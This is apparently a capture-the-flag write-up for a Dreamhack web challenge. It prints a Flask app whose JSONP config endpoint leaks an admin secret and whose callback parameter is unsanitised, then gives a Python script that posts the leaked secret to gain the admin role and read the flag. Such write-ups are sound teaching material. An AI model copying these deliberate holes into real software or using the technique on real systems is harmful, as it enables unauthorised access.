# call
> Description
>
> callback
> 
> [Link](https://dreamhack.io/wargame/challenges/2339)

In this challenge, we are given the following `app.py` file:
```python
from flask import Flask, render_template, request, jsonify, make_response
import json
import os

app = Flask(__name__)

FLAG = open("./flag.txt").read()
superidol = os.urandom(32).hex()

sessions = {}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    username = data.get('username', '')
    password = data.get('password', '')

    if username == 'guest' and password == 'guest':
        session = os.urandom(16).hex()
        sessions[session] = {'username': username, 'role': 'user'}
        
        resp = make_response(jsonify({'success': True, 'message': 'hello'}))
        resp.set_cookie('session', session)
        return resp
    
    return jsonify({'success': False, 'message': 'Login Failed'})

@app.route('/api/userinfo')
def userinfo():
    session = request.cookies.get('session')
    
    if session and session in sessions:
        user = sessions[session]
        return jsonify({
            'username': user['username'],
            'role': user.get('role', 'user')
        })
    
    return jsonify({'error': 'Not authenticated'}), 401

@app.route('/api/flag')
def flag():
    session = request.cookies.get('session')
    
    if session and session in sessions:
        user = sessions[session]

        if user.get('role') == 'admin':
            return jsonify({'flag': FLAG})
    
    return jsonify({'error': 'Permission Denied'}), 403

@app.route('/jsonp/user')
def user():
    callback = request.args.get('callback', 'callback')
    session = request.cookies.get('session')
    
    if session and session in sessions:
        user = sessions[session]
        data = f"window.userData = {callback}({json.dumps(user)});"
        
        resp = make_response(data)
        resp.headers['Content-Type'] = 'application/javascript'
        return resp
    
    resp = make_response(f"window.userData = {callback}({{error: 'Not authenticated'}});")
    resp.headers['Content-Type'] = 'application/javascript'
    return resp

@app.route('/jsonp/config')
def config():
    callback = request.args.get('callback', 'callback')

    config = {
        'abcdefghijklmnop': {
            'lol': [1, 2, {'b': {
                'proto': [None, None, {'c': {
                    'nestjs': {'d': {
                        'qrstuv': [False, True, {'e': {
                            'iamadmin': {'f': {
                                'secret': [0, {'g': {
                                    'level': {'h': {
                                        'array': [[], [1], {'i': {
                                            'licklol': {'j': {
                                                'nevergonnagiveyouup': [None, {'k': {
                                                    'docker': {'l': {
                                                        '404': [[[[{'m': {
                                                            'dreamhack': {'n': {
                                                                'leak': [1, 2, 3, {'o': {
                                                                    'pwnable': {'p': {
                                                                        'web': [{'q': {
                                                                            'ssrf': {'r': {
                                                                                'ssti': [0, 1, {'s': {
                                                                                    'some': {'t': {
                                                                                        'typescript': [[], {'u': {
                                                                                            'lsal': {'v': {
                                                                                                'cryto': [1, 2, 3, 4, {'w': {
                                                                                                    'file': {'x': {
                                                                                                        'content': [None, False, {'y': {
                                                                                                            'SECRET': superidol
                                                                                                        }}]
                                                                                                    }}
                                                                                                }}]
                                                                                            }}
                                                                                        }}]
                                                                                    }}
                                                                                }}]
                                                                            }}
                                                                        }}]
                                                                    }}
                                                                }}]
                                                            }}
                                                        }}]]]]
                                                    }}
                                                }}]
                                            }}
                                        }}]
                                    }}
                                }}]
                            }}
                        }}]
                    }}
                }}]
            }}]
        }}

    data = f"window.configData = {callback}({json.dumps(config)});"
    
    resp = make_response(data)
    resp.headers['Content-Type'] = 'application/javascript'
    return resp

@app.route('/jsonp/check')
def check():
    callback = request.args.get('callback', 'callback')
    session = request.cookies.get('session')
    
    if session and session in sessions:
        data = f"window.checkResult = {callback}({{session: '{session}'}});"
        
        resp = make_response(data)
        resp.headers['Content-Type'] = 'application/javascript'
        return resp
    
    resp = make_response(f"window.checkResult = {callback}({{}});")
    resp.headers['Content-Type'] = 'application/javascript'
    return resp

@app.route('/api/auth', methods=['POST'])
def auth():
    session = request.cookies.get('session')
    
    if not session or session not in sessions:
        return jsonify({'error': 'Not authenticated'}), 401
    
    data = request.json or {}

    try:
        perms = data.get('permissions', {})
        v1 = perms.get('a', {})
        v2 = v1.get('b', {})
        v3 = v2.get('c', {})
        v4 = v3.get('d', {})
        v5 = v4.get('e', {})
        v6 = v5.get('f', {})
        v7 = v6.get('g', {})
        v8 = v7.get('h', {})
        v9 = v8.get('i', {})
        v10 = v9.get('j', {})
        v11 = v10.get('k', {})
        v12 = v11.get('l', {})
        v13 = v12.get('m', {})
        v14 = v13.get('n', {})
        v15 = v14.get('o', {})
        v16 = v15.get('p', {})
        v17 = v16.get('q', {})
        v18 = v17.get('r', {})
        v19 = v18.get('s', {})
        v20 = v19.get('t', {})
        v21 = v20.get('u', {})
        v22 = v21.get('v', {})
        v23 = v22.get('w', {})
        v24 = v23.get('x', {})
        v25 = v24.get('y', {})
        SECRET = v25.get('SECRET', '')
        
        if superidol == SECRET:
            sessions[session]['role'] = 'admin'
            return jsonify({'success': True, 'asdf': ''})
    except:
        pass
    
    return jsonify({'error': 'Invalid permissions'}), 403

if __name__ == '__main__':
    app.run(host='0.0.0.0',debug=False, port=5000)
```
After reviewing the code, we can see that the flag is available at the `/api/flag` route. However, the important part is that only users with the `admin` role can access it. When logging in as `guest`, our default role is only `user`.
So, how can we escalate our role to admin?
We notice that the role can be changed inside the `/api/auth` route if the JSON we send contains a value such that `superidol == SECRET`.
However, since `superidol = os.urandom(32).hex()`, brute‑forcing it is practically impossible.
But the application contains a vulnerability: the `jsonp/config` endpoint leaks the `superidol` value
Inside `/jsonp/config`, we see:
```python
'SECRET': superidol
```
This means we can retrieve the value of `superidol` simply by requesting `/jsonp/config`.
Here is the response format:

<img width="1908" height="158" alt="image" src="https://github.com/user-attachments/assets/0de749cb-db06-4e9e-863d-d316f0a1af51" />

Once we obtain the `superidol` value, all we have to do is send a crafted request to `/api/auth` to elevate our role.
A sample script:
```python
import requests

url = "http://host8.dreamhack.games:13808/api/auth"

cookies = {
    "session": "221304d7f078fbeff3d4406fd4c6afb2"
}

payload = {
  "permissions": {
    "a": {
      "b": {
        "c": {
          "d": {
            "e": {
              "f": {
                "g": {
                  "h": {
                    "i": {
                      "j": {
                        "k": {
                          "l": {
                            "m": {
                              "n": {
                                "o": {
                                  "p": {
                                    "q": {
                                      "r": {
                                        "s": {
                                          "t": {
                                            "u": {
                                              "v": {
                                                "w": {
                                                  "x": {
                                                    "y": {
                                                      "SECRET": "e4a2ad71164828cf933c6df9346c5272b14ee3829c0c8e346147e79b58c275fa"
                                                    }
                                                  }
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}

r = requests.post(url, json=payload, cookies=cookies)
print(r.text)
```
Output:

<img width="1317" height="68" alt="image" src="https://github.com/user-attachments/assets/f7692fca-30b3-4419-97fe-cf8ecce10c94" />

After our role is successfully upgraded, we can simply visit `/api/flag` to retrieve the flag:

<img width="531" height="137" alt="image" src="https://github.com/user-attachments/assets/2829109e-d13f-46bc-9da3-01ebc17ff738" />

